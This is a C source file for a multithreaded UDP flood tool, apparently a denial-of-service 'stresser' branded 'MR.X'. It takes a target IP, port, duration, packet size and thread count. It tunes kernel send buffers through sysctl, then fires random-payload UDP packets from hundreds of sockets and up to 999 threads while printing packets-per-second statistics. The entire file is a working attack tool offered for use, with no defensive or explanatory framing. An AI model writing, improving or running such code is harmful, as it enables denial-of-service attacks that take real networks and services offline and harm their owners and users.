#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>

#define BUFFER_COUNT 1536
#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 999
#define MIN_ATTACK_TIME 5
#define MAX_ATTACK_TIME 300

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int global_start_time = 0;

char *buffers[BUFFER_COUNT];
struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=2000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='33554432 33554432 33554432' >/dev/null 2>&1");
#endif
}

void set_sock_buf(int sock) {
    int buf = 33554432;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
}

void fill_data(char *buf, int sz, unsigned int sd) {
    for (int i = 0; i < sz; i++) {
        sd = (sd * 1103515245 + 12345);
        buf[i] = (char)((sd >> 16) & 0xFF);
    }
}

void *direct_attack(void *arg) {
    int socks[FLOOD_SOCKETS];
    char *pkt = malloc(PACKET_SIZE);
    fill_data(pkt, PACKET_SIZE, time(NULL) ^ getpid());
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        int opt = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
        set_sock_buf(socks[i]);
        
        int flg = fcntl(socks[i], F_GETFL, 0);
        if (flg >= 0) fcntl(socks[i], F_SETFL, flg | O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(1024 + (rand() % 64511));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
    }
    
    int start_time = atomic_load(&global_start_time);
    
    while (!atomic_load(&stop_signal)) {
        for (int i = 0; i < FLOOD_SOCKETS; i++) {
            if (socks[i] < 0) continue;
            
            for (int j = 0; j < 60; j++) {
                int ret = sendto(socks[i], pkt, PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (ret > 0) {
                    atomic_fetch_add(&total_packets, 1);
                    atomic_fetch_add(&total_bytes, PACKET_SIZE);
                }
            }
        }
        
        if (ATTACK_TIME > 60) {
            usleep(500);
        }
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    free(pkt);
    return NULL;
}

int init_buffers() {
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    unsigned int base = time(NULL) ^ getpid();
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        buffers[i] = malloc(PACKET_SIZE);
        if (!buffers[i]) {
            for (int j = 0; j < i; j++) free(buffers[j]);
            return 0;
        }
        fill_data(buffers[i], PACKET_SIZE, base ^ (i * 1234567));
    }
    return 1;
}

void cleanup_buffers() {
    for (int i = 0; i < BUFFER_COUNT; i++) {
        if (buffers[i]) {
            free(buffers[i]);
            buffers[i] = NULL;
        }
    }
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int c = sysconf(_SC_NPROCESSORS_ONLN);
    if (c > 0) {
        CPU_SET(tid % c, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    int o = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &o, sizeof(o));
    set_sock_buf(s);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(1024 + (rand() % 64511));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr));
    
    int f = fcntl(s, F_GETFL, 0);
    if (f >= 0) fcntl(s, F_SETFL, f | O_NONBLOCK);
    
    int idx = tid % BUFFER_COUNT;
    int start_time = atomic_load(&global_start_time);
    
    while (!atomic_load(&stop_signal) && (time(NULL) - start_time) < ATTACK_TIME) {
        for (int i = 0; i < 120; i++) {
            int r = sendto(s, buffers[idx], PACKET_SIZE, MSG_DONTWAIT,
                         (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (r > 0) {
                idx = (idx + 1) % BUFFER_COUNT;
                atomic_fetch_add(&total_packets, 1);
                atomic_fetch_add(&total_bytes, PACKET_SIZE);
            }
        }
        
        if (ATTACK_TIME > 30) {
            usleep(250);
        }
    }
    
    close(s);
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %ds | 📦 Packet: %d bytes\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    unsigned long long current_peak = 0;
    
    int start_time = atomic_load(&global_start_time);
    int elapsed = 1;
    
    while (elapsed <= ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (pps > current_peak) {
            current_peak = pps;
        }
        
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        printf("🔥  PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, current_peak/1000, megabytes);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        elapsed++;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    unsigned long long peak = atomic_load(&peak_pps);
    double avg_pps = total_p / (double)ATTACK_TIME;
    double total_mb = total_b / (1024.0 * 1024.0);
    
    printf("\n🚀 MR.X NEVER END 🚀\n");
    printf("✅ Total Packets: %llu\n", total_p);
    printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
    printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    optimize_kernel();
    
    if (!init_buffers()) {
        printf("Buffer initialization failed\n");
        return 1;
    }
    
    atomic_store(&global_start_time, time(NULL));
    
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, NULL);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        cleanup_buffers();
        printf("Memory allocation failed\n");
        return 1;
    }
    
    printf("Created %d attack threads\n", THREAD_COUNT);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(ATTACK_TIME);
    
    printf("Stopping attack...\n");
    atomic_store(&stop_signal, 1);
    sleep(1);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    cleanup_buffers();
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}